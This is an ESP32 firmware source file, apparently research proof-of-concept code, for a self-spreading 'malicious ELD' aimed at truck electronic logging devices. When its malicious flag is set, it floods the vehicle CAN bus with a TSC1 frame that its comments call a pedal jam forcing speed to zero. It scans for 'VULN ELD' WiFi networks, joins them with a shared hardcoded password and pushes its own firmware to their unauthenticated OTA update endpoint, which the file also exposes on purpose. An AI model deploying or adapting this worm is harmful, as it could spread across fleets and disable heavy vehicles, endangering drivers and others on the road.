#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/event_groups.h"
#include "esp_mac.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "nvs_flash.h"
#include "esp_http_client.h"
#include "esp_http_server.h"
#include "esp_log.h"
#include "driver/twai.h"
#include "driver/gpio.h"
#include "esp_system.h"
#include "esp_spiffs.h"
#include "esp_ota_ops.h"
#include "esp_netif_types.h"
#include "esp_image_format.h"


/* ***************************** Configuration ***************************** */
#define MALICIOUS_ELD true
#define FIRMWARE_BUFFER_SIZE 4096 // Increase for potentially faster OTA updates

#if MALICIOUS_ELD
    // Malicious Petal JAM CAN message.
    #define CAN_MESSAGE_ID 0x0C000003 // TSC1 ID
    #define CAN_MESSAGE_DATA {0xCB, 0x00, 0x00, 0x00, 0xFF, 0x00, 0xFF, 0xFF} // Set speed to 0, aka pedal jam.
    #define CAN_MESSAGE_DATA_LENGTH 8
    #define CAN_MESSAGE_TRANSMIT_DELAY 10 // In milliseconds
#else
    // "Safe" CAN message data. Somewhat random message ID and data chosen for easy identification.
    #define CAN_MESSAGE_ID 0x0CF00400 // Some what random ID chosen
    #define CAN_MESSAGE_DATA {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
    #define CAN_MESSAGE_DATA_LENGTH 8
    #define CAN_MESSAGE_TRANSMIT_DELAY 50 // In milliseconds
#endif

/* ************************** Defines and Globals ************************** */
static char firmware_buffer[FIRMWARE_BUFFER_SIZE];

// WiFi configuration
#if MALICIOUS_ELD
    #define WIFI_AP_SSID_PREFIX "COMP ELD:" // Compromised ELD
#else
    #define WIFI_AP_SSID_PREFIX "VULN ELD:" // Vulnerable ELD
#endif
#define WIFI_STA_SSID_PREFIX "VULN ELD:" // Always search for vulnerable ELDs
#define WIFI_PASS "de******77"
#define MAX_RETRY 5
static int retry_num = 0;
static char ap_ssid[32];
static bool is_looking_for_eld = true;
static bool started_scan = false;
static wifi_ap_record_t ap_records[20];
#define WIFI_TASK_STACK_SIZE 4 * FIRMWARE_BUFFER_SIZE

// TAGs for logging
static const char *TAG_AP = "WiFi SoftAP";
static const char *TAG_STA = "WiFi Sta";
static const char *TAG = "OTA Update";
static const char *HTTP_TAG = "HTTP Server";
static const char *CAN_TAG = "CAN";

// Macros
#define MIN(a, b) ((a) < (b) ? (a) : (b))

// HTTP server
httpd_handle_t server;
#define SERVER_STACK_SIZE 2 * FIRMWARE_BUFFER_SIZE

// CAN
static twai_general_config_t can_config = TWAI_GENERAL_CONFIG_DEFAULT(GPIO_NUM_2, GPIO_NUM_15, TWAI_MODE_NORMAL);
static twai_timing_config_t baud_rate = TWAI_TIMING_CONFIG_500KBITS();
static twai_filter_config_t filter = TWAI_FILTER_CONFIG_ACCEPT_ALL();
static twai_message_t can_message = {
    .identifier = CAN_MESSAGE_ID,
    .flags = TWAI_MSG_FLAG_EXTD,
    .data_length_code = CAN_MESSAGE_DATA_LENGTH,
    .data = CAN_MESSAGE_DATA,
};

// Misc
esp_netif_t *esp_netif_sta;
#define FIRMWARE_SENDING_STACK_SIZE 2 * FIRMWARE_BUFFER_SIZE


/* ******************************* Functions ******************************* */

/* *************************** Scan and Propagate ************************** */
void send_ota_update(const char *target_url, const esp_partition_t *running, const esp_image_metadata_t *data) {
    ESP_LOGI(TAG, "Sending firmware to %s", target_url);

    // This sets the interface for the connection, otherwise it'll connect to itself
    struct ifreq ifr;
    ESP_ERROR_CHECK(esp_netif_get_netif_impl_name(esp_netif_sta, ifr.ifr_name));

    esp_http_client_config_t config = {
        .url = target_url,
        .method = HTTP_METHOD_POST,
        .timeout_ms = 10000,
        .if_name = &ifr,
    };
    esp_http_client_handle_t client = esp_http_client_init(&config);
    if (client == NULL) {
        ESP_LOGE(TAG, "Failed to initialize HTTP client");
        return;
    }

    esp_http_client_set_header(client, "Content-Type", "application/octet-stream");
    char content_length[32];
    sprintf(content_length, "%ld", data->image_len);
    esp_http_client_set_header(client, "Content-Length", content_length);

    // Perform the POST request
    esp_err_t err;
    err = esp_http_client_open(client, data->image_len);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to open HTTP connection: %s", esp_err_to_name(err));
        esp_http_client_cleanup(client);
        return;
    }

    // Read firmware and send it
    ESP_LOGI(TAG, "Reading data from running partition: %s", running->label);
    size_t offset = 0;
    size_t read_size = 0;
    do {
        read_size = MIN(FIRMWARE_BUFFER_SIZE, data->image_len - offset);
        err = esp_partition_read(running, offset, firmware_buffer, read_size);
        if (err != ESP_OK) {
            ESP_LOGE(TAG, "Failed to read data from partition: %s", esp_err_to_name(err));
            break;
        }
        esp_http_client_write(client, firmware_buffer, read_size);
        offset += read_size;
        ESP_LOGI(TAG, "Sent: %lu%% (%lu/%lu)", (uint32_t)(offset * 100) / data->image_len, (uint32_t)offset, data->image_len);
    } while (err == ESP_OK && read_size == FIRMWARE_BUFFER_SIZE);

    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed during firmware transmission");
    }

    // Cleanup
    esp_http_client_close(client);
    esp_http_client_cleanup(client);
}

void firmware_sending_task(void *pvParameter) {
    ESP_LOGI(TAG, "Starting firmware sending task...");
    ESP_LOGI(TAG, "Getting partition information.");
    const esp_partition_t *running = esp_ota_get_running_partition();
    if (running == NULL) {
        ESP_LOGE(TAG, "Running partition could not be found");
        return;
    }

    const esp_partition_pos_t partition_pos = {
        .offset = running->address,
        .size = running->size,
    };
    esp_image_metadata_t data;
    if (esp_image_get_metadata(&partition_pos, &data) != ESP_OK) {
        ESP_LOGE(TAG, "Failed to get image metadata");
        return;
    }

    // URL of the target device to send the firmware
    const char* target_url = "http://192.168.4.1/update-api";

    // Call the send firmware function
    send_ota_update(target_url, running, &data);

    // Delete this task when done
    vTaskDelete(NULL);
}


/* ********************************** WiFi ********************************** */
/* Initialize wifi station */
void wifi_init_sta(const char *ssid)
{
    wifi_config_t wifi_sta_config = {
        .sta = {
            .password = WIFI_PASS,
            .scan_method = WIFI_ALL_CHANNEL_SCAN,
            .failure_retry_cnt = MAX_RETRY,
            .threshold.authmode = WIFI_AUTH_WPA2_PSK,
        },
    };
    memcpy(wifi_sta_config.sta.ssid, ssid, sizeof(wifi_sta_config.sta.ssid));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &wifi_sta_config) );
    ESP_LOGI(TAG_STA, "wifi_init_sta finished.");
    ESP_LOGI(TAG_STA, "connecting to AP");
    esp_wifi_connect();
}

/* Initialize soft AP */
esp_netif_t *wifi_init_softap(void)
{
    esp_netif_t *esp_netif_ap = esp_netif_create_default_wifi_ap();
    uint8_t mac[6];
    esp_wifi_get_mac(ESP_IF_WIFI_STA, mac);
    char ap_ssid[32];
    snprintf(ap_ssid, sizeof(ap_ssid), "%s %02X:%02X:%02X:%02X:%02X:%02X", WIFI_AP_SSID_PREFIX, 
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    wifi_config_t wifi_ap_config = {
        .ap = {
            .ssid_len = strlen(ap_ssid),
            .password = WIFI_PASS,
            .authmode = WIFI_AUTH_WPA2_PSK,
            .pmf_cfg = {
                .required = false,
            },
            .max_connection = 4,
        },
    };
    memcpy(wifi_ap_config.ap.ssid, ap_ssid, sizeof(ap_ssid));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wifi_ap_config));
    ESP_LOGI(TAG_AP, "wifi_init_softap finished. SSID:%s password:%s", ap_ssid, WIFI_PASS);

    return esp_netif_ap;
}

void scan_done_handler()
{
    uint16_t max_ap = 20;
    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&max_ap, ap_records));
    printf("Number of Access Points Found: %d\n", max_ap);
    printf("\n");
    printf("               SSID              | Channel | RSSI \n");
    printf("***************************************************************\n");
    for (int i = 0; i < max_ap; i++)
        printf("%32s | %7d | %4d \n", (char *)ap_records[i].ssid, ap_records[i].primary, ap_records[i].rssi);
    printf("***************************************************************\n");
    for (int i = 0; i < max_ap; i++)
    {
        if (strncmp((char *)ap_records[i].ssid, WIFI_STA_SSID_PREFIX, strlen(WIFI_STA_SSID_PREFIX)) == 0 &&
            strcmp((char *)ap_records[i].ssid, ap_ssid) != 0)
        {
            // Found a matching SSID that is not our own AP
            ESP_LOGI(TAG, "Found ESP to connect to: %s", ap_records[i].ssid);
            is_looking_for_eld = false;
            wifi_init_sta((char *)ap_records[i].ssid);
            break;
        }
    }
}

void wifi_scan() {
    // Scan for vulnerable ESPs if MALICIOUS_ELD is defined
    wifi_scan_config_t scan_config = { 0 };
    while (1) {
        if (MALICIOUS_ELD && is_looking_for_eld) {
            ESP_LOGI(TAG_STA, "Scanning for vulnerable ESPs...");
            ESP_ERROR_CHECK(esp_wifi_scan_start(&scan_config, false));
            started_scan = true;
        }
        vTaskDelay(pdMS_TO_TICKS(5000));
    }
}

static void wifi_event_handler(void* arg, esp_event_base_t event_base, int32_t event_id, void* event_data) {
    if (event_id == WIFI_EVENT_STA_START) {
        return;
    } else if (event_id == WIFI_EVENT_STA_CONNECTED) {
        vTaskDelay(pdMS_TO_TICKS(5000)); // To allow the DHCP to finish
        wifi_event_sta_connected_t* event = (wifi_event_sta_connected_t*) event_data;
        ESP_LOGI(TAG_STA, "connected to AP, SSID: %s", event->ssid);
    } else if (event_id == WIFI_EVENT_STA_DISCONNECTED) {
        if (retry_num < MAX_RETRY) {
            esp_wifi_connect();
            retry_num++;
            ESP_LOGI(TAG_STA, "retry to connect to the AP");
        } else {
            is_looking_for_eld = true;
            ESP_LOGI(TAG_STA,"connect to the AP fail");
        }
    } else if (event_id == IP_EVENT_STA_GOT_IP) {
        retry_num = 0;
        ESP_LOGI(TAG, "Connected to AP, start sending firmware");
        xTaskCreate(&firmware_sending_task, "firmware_sending_task", FIRMWARE_SENDING_STACK_SIZE, NULL, 5, NULL);
    } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_SCAN_DONE && started_scan) {
        scan_done_handler();
        started_scan = false;
    }
}

void wifi_setup_task(void *pvParameters) {
    // Create event handlers
    esp_event_handler_instance_t instance_any_id;
    esp_event_handler_instance_t instance_got_ip;
    esp_event_handler_instance_t instance_scan_done;
    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT,
                                                        ESP_EVENT_ANY_ID,
                                                        &wifi_event_handler,
                                                        NULL,
                                                        &instance_any_id));
    ESP_ERROR_CHECK(esp_event_handler_instance_register(IP_EVENT,
                                                        IP_EVENT_STA_GOT_IP,
                                                        &wifi_event_handler,
                                                        NULL,
                                                        &instance_got_ip));
    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT,
                                                        WIFI_EVENT_SCAN_DONE,
                                                        &wifi_event_handler,
                                                        NULL,
                                                        &instance_scan_done));
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));

    /* Initialize AP */
    ESP_LOGI(TAG_AP, "ESP_WIFI_MODE_AP");
    wifi_init_softap();
    esp_netif_sta = esp_netif_create_default_wifi_sta();
    // Set default interface to STA
    esp_netif_set_default_netif(esp_netif_sta);

    ESP_ERROR_CHECK(esp_wifi_start());

    wifi_scan();
}


/* ********************************** HTTP ********************************** */
esp_err_t ota_update_handler(httpd_req_t *req) {
    char ota_buff[FIRMWARE_BUFFER_SIZE];  // Buffer to store OTA data chunks
    int received = 0;
    esp_ota_handle_t update_handle = 0;
    const esp_partition_t *update_partition = NULL;

    // Get the content size of the OTA update
    int content_len = req->content_len;
    ESP_LOGI(TAG, "OTA update file content length: %d", content_len);

    ESP_LOGI(TAG, "Starting OTA...");
    // Get the next OTA update partition
    update_partition = esp_ota_get_next_update_partition(NULL);
    if (update_partition == NULL) {
        ESP_LOGE(TAG, "No update partition found");
        return ESP_FAIL;
    }

    esp_err_t ota_begin_err = esp_ota_begin(update_partition, OTA_SIZE_UNKNOWN, &update_handle);
    if (ota_begin_err != ESP_OK) {
        ESP_LOGE(TAG, "OTA begin failed");
        return ESP_FAIL;
    }

    while (1) {
        int data_read = httpd_req_recv(req, ota_buff, sizeof(ota_buff));
        if (data_read < 0) {
            // Error occurred during receiving
            if (data_read == HTTPD_SOCK_ERR_TIMEOUT) {
                /* Retry receiving if timeout occurred */
                continue;
            }
            ESP_LOGE(TAG, "File upload failed");
            esp_ota_abort(update_handle);
            return ESP_FAIL;
        } else if (data_read > 0) {
            // Write OTA data to partition
            // Remove boundary and content tags from the buffer if request is not for the /update-api endpoint
            if (received == 0 && strstr(req->uri, "/update-api") == NULL) {
                char *content = strstr(ota_buff, "\r\n\r\n") + 4;
                data_read -= (content - ota_buff);
                memmove(ota_buff, content, data_read);
            }
            if (esp_ota_write(update_handle, (const void *)ota_buff, data_read) != ESP_OK) {
                ESP_LOGE(TAG, "OTA write failed");
                esp_ota_abort(update_handle);
                return ESP_FAIL;
            }
            received += data_read;
            ESP_LOGI(TAG, "Received: %d%% (%d/%d)", (received * 100) / content_len, received, content_len);
        } else if (data_read == 0) {
            // Received all OTA data, verify and set the OTA boot partition
            if (esp_ota_end(update_handle) != ESP_OK) {
                ESP_LOGE(TAG, "OTA end failed");
                return ESP_FAIL;
            }

            if (esp_ota_set_boot_partition(update_partition) != ESP_OK) {
                ESP_LOGE(TAG, "OTA set boot partition failed");
                return ESP_FAIL;
            }
            ESP_LOGI(TAG, "OTA update successful!");
            esp_restart();
            break;
        }
    }
    return ESP_OK;
}

esp_err_t get_html_page_handler(httpd_req_t *req) {
    /* HTML page content */
    const char *html_page = "<!DOCTYPE html><html><body>"
                            "<h1>Vulnerable OTA Update Webpage</h1>"
                            "<form method=\"POST\" enctype=\"multipart/form-data\" action=\"/update\">"
                            "<input type=\"file\" name=\"update\">"
                            "<input type=\"submit\" value=\"Update Firmware\">"
                            "</form></body></html>";
    httpd_resp_send(req, html_page, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

void http_server_task(void *pvParameters) {
    // Configure HTTP server
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.max_uri_handlers = 10;
    config.max_open_sockets = 7;
    config.stack_size = SERVER_STACK_SIZE;
    config.max_resp_headers = 32;

    // Start the HTTP server
    if (httpd_start(&server, &config) == ESP_OK) {
        ESP_LOGI(HTTP_TAG, "HTTP server started");
        // Handler for serving HTML page
        httpd_uri_t html_page_uri = {
            .uri       = "/",
            .method    = HTTP_GET,
            .handler   = get_html_page_handler,
            .user_ctx  = NULL
        };
        httpd_register_uri_handler(server, &html_page_uri);

        // Handler for OTA update
        httpd_uri_t ota_update_uri = {
            .uri       = "/update",
            .method    = HTTP_POST,
            .handler   = ota_update_handler,
            .user_ctx  = NULL
        };
        httpd_register_uri_handler(server, &ota_update_uri);

        // Handler for the API
        httpd_uri_t api_uri = {
            .uri       = "/update-api",
            .method    = HTTP_POST,
            .handler   = ota_update_handler,
            .user_ctx  = NULL
        };
        httpd_register_uri_handler(server, &api_uri);
        // Suspend the task, the HTTP server runs in its own thread
        vTaskSuspend(NULL);
    } else {
        ESP_LOGE(HTTP_TAG, "Failed to start HTTP server");
        return;
    }
}


/* ********************************** Main ********************************** */
void app_main() {
    //Initialize NVS
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        // 1.OTA app partition table has a smaller NVS partition size than the non-OTA
        // partition table. This size mismatch may cause NVS initialization to fail.
        // 2.NVS partition contains data in new format and cannot be recognized by this version of code.
        // If this happens, we erase NVS partition and initialize NVS again.
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());

    xTaskCreate(wifi_setup_task, "wifi_setup_task", WIFI_TASK_STACK_SIZE, NULL, 5, NULL);
    xTaskCreate(http_server_task, "http_server_task", FIRMWARE_BUFFER_SIZE, NULL, 5, NULL);

    // CAN Initialization
    if (twai_driver_install(&can_config, &baud_rate, &filter) != ESP_OK) {
        ESP_LOGE(CAN_TAG, "Failed to install driver");
        return;
    }

    if (twai_start() != ESP_OK) {
        ESP_LOGE(CAN_TAG, "Failed to start driver");
        return;
    }

    while (1) {
        esp_err_t result = twai_transmit(&can_message, pdMS_TO_TICKS(1000));
        if (result != ESP_OK) {
            // ESP_LOGE(CAN_TAG, "Failed to send CAN Message, error code: %s", esp_err_to_name(result));
        }
        vTaskDelay(pdMS_TO_TICKS(CAN_MESSAGE_TRANSMIT_DELAY));
    }
}
